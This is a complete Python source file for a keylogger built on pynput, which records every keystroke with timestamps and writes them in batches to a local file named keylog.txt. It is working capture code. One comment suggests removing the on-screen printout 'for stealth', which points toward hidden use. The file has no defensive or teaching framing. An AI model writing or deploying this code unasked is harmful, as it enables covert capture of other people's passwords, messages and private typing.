from pynput.keyboard import Key, KeyCode, Listener
from datetime import datetime
from threading import Timer
import time

class KeyLogger:
    def __init__(self, interval=30, batch_size=10, filename="log.txt"):
        self.batch_size = batch_size
        self.interval = interval
        self.filename = filename
        self.pressed_keys = []
        self.timer = None
        self.listener = None

    def on_press(self, key):
        """Handle key press events"""
        self.pressed_keys.append(key)
        
        # Write if batch size is reached
        if len(self.pressed_keys) >= self.batch_size:
            self.flush()
            
        # Optional: Remove print statement for stealth
        print(f"Key pressed: {key}")

    def flush(self):
        """Force write buffered keys to file"""
        if self.pressed_keys:
            self.write_to_file()
            self.pressed_keys = []
        self.reset_timer()

    def reset_timer(self):
        """Reset interval timer after each flush"""
        if self.timer:
            self.timer.cancel()
        self.timer = Timer(self.interval, self.flush)
        self.timer.daemon = True
        self.timer.start()

    def write_to_file(self):
        """Write buffered keys to log file with error handling"""
        try:
            with open(self.filename, "a", encoding="utf-8") as f:
                f.write(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
                for key in self.pressed_keys:
                    # Handle special keys
                    if isinstance(key, Key):
                        if key == Key.space:
                            f.write(" ")
                        elif key == Key.enter:
                            f.write("\n")
                        elif key == Key.tab:
                            f.write("\t")
                    # Handle normal characters
                    elif isinstance(key, KeyCode):
                        if key.char is not None:
                            f.write(key.char)
        except Exception as e:
            print(f"Error writing to file: {e}")

    def on_release(self, key):
        """Stop listener on ESC key release"""
        if key == Key.esc:
            self.flush()
            return False

    def start(self):
        """Start keylogger and timing mechanisms"""
        self.reset_timer()
        self.listener = Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()
        self.listener.join()

if __name__ == "__main__":
    logger = KeyLogger(
        interval=30,    # Flush every 30 seconds
        batch_size=20,  # Or when 20 keys are logged
        filename="keylog.txt"
    )
    logger.start()
